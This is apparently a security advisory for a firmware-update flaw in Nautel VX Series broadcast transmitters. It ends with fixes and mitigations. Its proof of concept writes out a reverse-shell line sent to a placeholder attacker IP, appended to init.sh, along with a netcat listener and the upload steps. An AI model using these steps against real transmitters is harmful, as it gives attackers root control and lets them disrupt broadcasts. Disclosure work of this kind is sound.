# Nautel VX Series Remote Code Execution (RCE) Vulnerability

## Description

The Nautel VX Series transmitters (firmware versions VX_SW_6.4.0 and below) contain a remote code execution (RCE) vulnerability in the firmware update process. Attackers can download the official update package, modify the included `init.sh` script to include malicious commands, and re-upload it to the `/#/software/upgrades` endpoint. Upon execution, the attack grants root access to the device.  

This vulnerability arises due to the **lack of digital signature verification** on uploaded firmware packages.  

## Vendor Information

- **Vendor**: Nautel  
- **Vendor Homepage**: [https://www.nautel.com/](https://www.nautel.com/)  

## Affected Products

- **Product**: Nautel VX Series  
- **Firmware/Software Versions Affected**:
  - VX_SW_6.4.0  
  - VX_SW_6.3.2  
  - VX_SW_6.3.1  
  - VX_SW_6.3.0  
  - VX_SW_6.1.1  
  - VX_SW_6.1.0  
  - VX_SW_6.0.3  

## Vulnerable Endpoint

- **Web Interface Software Update Page**:  
http://<target-ip>/#/software/upgrades


## Attack Type

- **Type**: Remote Code Execution (RCE)  
- **Classification**: Unauthorized Privilege Escalation via Software Update Manipulation  

## Impact

- **Severity**: Critical  
- **Description**:  
The Nautel VX Series transmitters contain an **unauthenticated remote code execution (RCE) vulnerability** in the software upgrade process. An attacker can modify firmware update files before uploading them to the device, leading to remote code execution with **root privileges**.  

By exploiting the `/#/software/upgrades` endpoint, an attacker can:
1. Download a legitimate update package (`.tgz`) from:
   ```
   http://www3.nautel.com/pub/VX_Series/
   ```
2. Extract and modify the `init.sh` script inside the package to include a reverse shell payload.  
3. Recompress and upload the malicious firmware to the transmitter via `/#/software/upgrades`.  
4. Initiate the upgrade process, which executes `init.sh`, granting **root-level shell access** to the attacker.  

## Affected Components

- **Firmware Update System** (`/#/software/upgrades`)  
- **Lack of Signature Verification** on Software Updates  

## Attack Vector

- **Access Method**: Remote unauthorized firmware modification  
- **Authentication Requirement**: None (if update process lacks validation)  
- **Exploit Complexity**: Low  

---

## Proof of Concept (PoC)

### Steps to Reproduce:

1. **Download the official VX Series firmware update (`.tgz`) from:**
http://www3.nautel.com/pub/VX_Series/
2. **Extract the `.tgz` archive and locate `init.sh`:**
```bash
tar -xvf VX_update_6.4.0.tgz
cd VX_update_6.4.0/
```
3. **Modify init.sh to include a reverse shell payload:**
   ```bash
   echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> init.sh
   ```
4. **Repack the firmware update:**
   ```bash
   tar -cvf VX_update_malicious.tgz *
   ```
5. **Upload the modified firmware to the transmitter's web interface:**
   - ** Navigate to:**

          http://<target-ip>/#/software/upgrades

    - ** Select and upload VX_update_malicious.tgz.**

6. **UStart a listener on the attacker's machine:**U
    ```bash
    nc -lvnp 4444
    ```

7. **UInitiate the update process on the transmitter.**
8. **UReceive a reverse shell with root access.**

---
# PoC Video

- **Demo Video**: [https://github.com/user-attachments/assets/0da69449-f252-46eb-a348-2de31e269ba5]  

---

# Vulnerability Type Information

- **Vulnerability Type**: Remote Code Execution via Unauthorized Firmware Modification  
- **CWE-ID**: [CWE-347 - Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)  
- **Definition**: The firmware update mechanism fails to validate digital signatures, allowing attackers to upload and execute modified firmware with arbitrary code.  

---

# Impact Information

### **Impact Type:**
- **Remote Code Execution (RCE)**: Attackers gain full control over the transmitter.  
- **Privilege Escalation**: The malicious script executes with **root privileges**.  
- **Network Compromise**: Attackers can pivot into internal networks.  
- **Broadcast Disruption**: Unauthorized firmware updates can **shut down** or alter transmission parameters.  

---

# Suggested Fixes

### **1. Implement Digital Signature Verification on Firmware Updates**
   - Ensure all update packages are **cryptographically signed** and verified before execution.  

### **2. Restrict Software Upload Access to Authorized Users Only**
   - Require **multi-factor authentication (MFA)** before allowing firmware updates.  

### **3. Implement Integrity Checks on Uploaded Files**
   - Use **SHA256 hash validation** to detect modified firmware before installation.  

### **4. Limit Execution Permissions on Update Scripts**
   - Prevent arbitrary execution of scripts in firmware update packages.  

---

# Mitigation & Workarounds

Until an official patch is released, **administrators should**:

- **Disable remote software updates** unless verified through **Nautel’s official process**.  
- **Monitor firmware upload logs** for suspicious activity.  
- **Use network firewalls** to block unauthorized access to the update endpoint.  

---

# Disclaimer

This report is for **educational and security research purposes only**. Unauthorized access or exploitation of any system without proper authorization **violates cybersecurity laws** and may result in legal consequences.  

---

# References

- [Nautel VX Series Official Page](https://www.nautel.com/)  
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)  

